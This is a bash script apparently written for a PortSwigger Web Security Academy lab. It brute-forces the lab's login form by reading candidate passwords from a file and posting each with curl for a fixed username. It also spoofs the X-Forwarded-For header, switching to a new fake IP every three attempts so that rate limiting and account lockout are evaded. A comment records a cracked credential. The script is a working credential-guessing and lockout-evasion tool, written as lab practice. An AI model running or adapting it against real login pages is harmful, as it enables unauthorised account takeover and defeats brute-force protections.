#!/bin/bash 
# username:123123 - response time: 3.105758s

. ./spoofIP.sh

#we have the username
username='akamai'

exec 3<&0
exec 0<./password.txt

URL='https://0aa700c704519df581fcd5f9005800bb.web-security-academy.net/login'
IPusagecount=0
IP=$(newIP)
session='qbhimCmfxEq8pNDGQmA4UNGbil75Fs0c'

# curl -X POST -d "username=akamainame&password=hello" -H "X-Forwarded-For: 123.123.123.132" --cookie "session=qbhimCmfxEq8pNDGQmA4UNGbil75Fs0c" https://0aa700c704519df581fcd5f9005800bb.web-security-academy.net/login -s | grep -iv "invalid\|attempts"

while read pass
do
    IPusagecount=$[$IPusagecount+1]
    out=$(curl -X POST -d "username=$username&password=$pass" -H "X-Forwarded-For: $IP" --cookie "session=$session" $URL -s | grep -i "invalid\|attempts")
    if [ $IPusagecount == 3 ]
    then
        IPusagecount=0
        IP=$(newIP)
    fi
    pattern='^.+(Invalid|attempts)*$'
    
    if [[ $out =~ $pattern ]]
    then
        continue
    else
        echo "try $pass with username $username"
    fi
    
    echo $out
    # if [ -n "$out" ]
    # then 
        # echo "try $pass with $username"
    # fi
done

exec 0<&3
exec 3>&-
exit